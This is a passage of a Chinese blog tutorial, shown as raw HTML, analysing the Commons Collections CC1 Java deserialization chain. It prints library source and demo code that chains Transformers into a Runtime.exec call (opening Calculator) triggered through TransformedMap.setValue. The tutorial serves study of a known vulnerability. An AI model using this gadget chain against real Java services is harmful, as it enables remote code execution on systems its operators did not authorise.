<span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">6374440726369055124L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object iConstant;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> iConstant;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个类用于创建一个每次都返回相同常量值的Transformer，<code>transform</code>方法接收传入的对象不会经过更改直接返回，示例代码如下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec.cc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConstantTransformerTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ConstantTransformer</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class);</span><br><span class="line"></span><br><span class="line">        System.out.println(t.transform(Runtime.class));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 运行结果：</span></span><br><span class="line"><span class="comment">class java.lang.Runtime</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h3><p><code>ChainedTransformer</code>类也实现了<code>Transformer</code>和<code>Serializable</code>接口，该类用于将多个Transformer链在一起，形成一个Transformer链。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.commons.collections.functors;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.util.Collection;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Transformer implementation that chains the specified transformers together.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * The input object is passed to the first transformer. The transformed result is passed to the second transformer and so on.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ChainedTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Serial version UID */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">3514945074733160196L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** The transformers to call in turn */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Transformer[] iTransformers;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> transformers  the transformers to chain, not copied, no nulls</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        iTransformers = transformers;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Transforms the input to result via each decorated transformer</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> object  the input object passed to the first transformer</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the transformed result</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">            object = iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时它提供了一个<code>transform</code>方法用于执行转换操作，依次将输入对象传递给链中的每个Transformer进行处理，并且每个Transformer的转换结果将作为下一个Transformer的输入。那么现在就可以将<code>InvokerTransformer</code>、<code>ConstantTransformer</code>、<code>ChainedTransformer</code>三者组合起来，实现一个本地命令执行的调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec.cc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ChainedTransformerTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] ts = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">tc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(ts);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">transform</span> <span class="operator">=</span> tc.transform(<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/post/java-deserialization-cc1-transformedmap/8.png"></p><h2 id="0x03-TransformedMap中间链"><a href="#0x03-TransformedMap中间链" class="headerlink" title="0x03 TransformedMap中间链"></a>0x03 TransformedMap中间链</h2><p><code>org.apache.commons.collections.map.TransformedMap</code>类继承自<code>AbstractInputCheckedMapDecorator</code>，间接实现了<code>Map</code>接口，它是一个装饰类，用于装饰其它<code>Map</code>对象，并对其键和值进行转换。<code>TransformedMap</code>中的<code>decorate</code>方法接收三个参数，类型分别是Map、Transformer和Transformer，这个方法用于创建一个装饰后的<code>Map</code>实例。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformedMap</span> <span class="keyword">extends</span> <span class="title class_">AbstractInputCheckedMapDecorator</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">7023152376788900464L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer keyTransformer;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer valueTransformer;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">        <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> Object <span class="title function_">transformKey</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (keyTransformer == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> object;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> keyTransformer.transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> Object <span class="title function_">transformValue</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (valueTransformer == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> object;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> valueTransformer.transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> Map <span class="title function_">transformMap</span><span class="params">(Map map)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (map.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span> map;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Map</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LinkedMap</span>(map.size());</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">Iterator</span> <span class="variable">it</span> <span class="operator">=</span> map.entrySet().iterator(); it.hasNext(); ) &#123;</span><br><span class="line">            Map.<span class="type">Entry</span> <span class="variable">entry</span> <span class="operator">=</span> (Map.Entry) it.next();</span><br><span class="line">            result.put(transformKey(entry.getKey()), transformValue(entry.getValue()));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">put</span><span class="params">(Object key, Object value)</span> &#123;</span><br><span class="line">        key = transformKey(key);</span><br><span class="line">        value = transformValue(value);</span><br><span class="line">        <span class="keyword">return</span> getMap().put(key, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">putAll</span><span class="params">(Map mapToCopy)</span> &#123;</span><br><span class="line">        mapToCopy = transformMap(mapToCopy);</span><br><span class="line">        getMap().putAll(mapToCopy);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当<code>TransformedMap</code>中的<code>put</code>或<code>putAll</code>方法被调用时，在其中会调用<code>transformKey</code>和<code>transformValue</code>方法，这两个方法中存在对输入对象的<code>transform</code>方法调用。</p><p>除了<code>put</code>或<code>putAll</code>方法外，当调用继承自<code>AbstractInputCheckedMapDecorator</code>类的<code>setValue</code>方法，在其中存在对<code>parent.checkSetValue</code>方法的调用，即调用<code>TransformedMap</code>中的<code>checkSetValue</code>方法，<code>checkSetValue</code>方法中同样存在对输入对象的<code>transform</code>方法调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">MapEntry</span> <span class="keyword">extends</span> <span class="title class_">AbstractMapEntryDecorator</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> AbstractInputCheckedMapDecorator parent;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">MapEntry</span><span class="params">(Map.Entry entry, AbstractInputCheckedMapDecorator parent)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(entry);</span><br><span class="line">        <span class="built_in">this</span>.parent = parent;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">        value = parent.checkSetValue(value);</span><br><span class="line">        <span class="keyword">return</span> entry.setValue(value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么结合以上的<code>InvokerTransformer</code>类中的<code>transform</code>，当传入一个恶意的<code>ChainedTransformer</code>至<code>decorate</code>方法中，并执行<code>setValue</code>方法时，就会触发命令的执行。注意，<code>decorate</code>方法接收的第一个参数是一个Map，但这个Map不可以为空，否则就会在<code>org.apache.commons.collections.map.AbstractMapDecorator#AbstractMapDecorator(java.util.Map)</code>中抛出异常。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec.cc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformedMapTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Transformer[] ts = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">tc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(ts);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">m</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        m.put(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;x&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 使用TransformedMap.decorate方法创建一个含有恶意调用链的Transformer类的Map对象</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">tm</span> <span class="operator">=</span>  TransformedMap.decorate(m, <span class="literal">null</span>, tc);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 执行put方法以触发transform方法的调用</span></span><br><span class="line">        <span class="comment">// tm.put(&quot;value&quot;, &quot;value&quot;);</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 遍历Map，调用setValue方法</span></span><br><span class="line">        <span class="keyword">for</span> (Object obj : tm.entrySet()) &#123;</span><br><span class="line">            Map.<span class="type">Entry</span> <span class="variable">entry</span> <span class="operator">=</span> (Map.Entry) obj;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 执行setValue方法以触发InvokerTransformer的transform方法调用</span></span><br><span class="line">            entry.setValue(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/post/java-deserialization-cc1-transformedmap/9.png"></p><h2 id="0x04-AnnotationInvocationHandler-Kick-off类"><a href="#0x04-AnnotationInvocationHandler-Kick-off类" class="headerlink" title="0x04 AnnotationInvocationHandler Kick-off类"></a>0x04 AnnotationInvocationHandler Kick-off类</h2><p>在如上的演示中，我们通过<code>TransformedMap</code>类中的<code>setValue</code>方法触发命令的执行，但在实际反序列化利用中，还需要一个重写了<code>readObject</code>方法且其中存在类似操作的类，这个类就是Kick-off入口类，即<code>sun.reflect.annotation.AnnotationInvocationHandler</code>。</p><h3 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h3><p><code>AnnotationInvocationHandler</code>类的构造方法如下，接收两个参数，第一个就是Annotation实现类的Class对象，第二个则是键为String值为Object的Map对象，在其中会对<code>superInterfaces</code>进行长度是否为一和是否是<code>java.lang.annotation.Annotation.class</code>的判断，如果条件成立，才会将接收的参数初始化到<code>type</code>和<code>memberValues</code>成员变量中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">6182022883658399397L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; memberValues;</span><br><span class="line"></span><br><span class="line">    AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">        Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span><br><span class="line">        <span class="keyword">if</span> (!type.isAnnotation() ||</span><br><span class="line">            superInterfaces.length != <span class="number">1</span> ||</span><br><span class="line">            superInterfaces[<span class="number">0</span>] != java.lang.annotation.Annotation.class)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.type = type;</span><br><span class="line">        <span class="built_in">this</span>.memberValues = memberValues;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="readObject方法"><a href="#readObject方法" class="headerlink" title="readObject方法"></a>readObject方法</h3><p>在重写的<code>readObject</code>方法中，首先调用了<code>defaultReadObject</code>方法恢复默认的反序列化操作，以读取<code>type</code>和<code>memberValues</code>字段的值；然后利用<code>AnnotationType.getInstance(this.type)</code>方法获取<code>type</code>这个注解类所对应的<code>AnnotationType</code>对象，并获取<code>memberTypes</code>；随后对<code>memberTypes</code>的成员值进行了遍历，对于每个成员值，如果既不是memberValue的实例也不是ExceptionProxy的实例，就会获取这个成员值，并调用<code>setValue</code>方法将其转换为异常代理并设置异常信息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span> <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(type);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">    <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">        Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">        <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!(memberType.isInstance(value) || value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                memberValue.setValue(<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(annotationType.members().get(name)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="反射调用"><a href="#反射调用" class="headerlink" 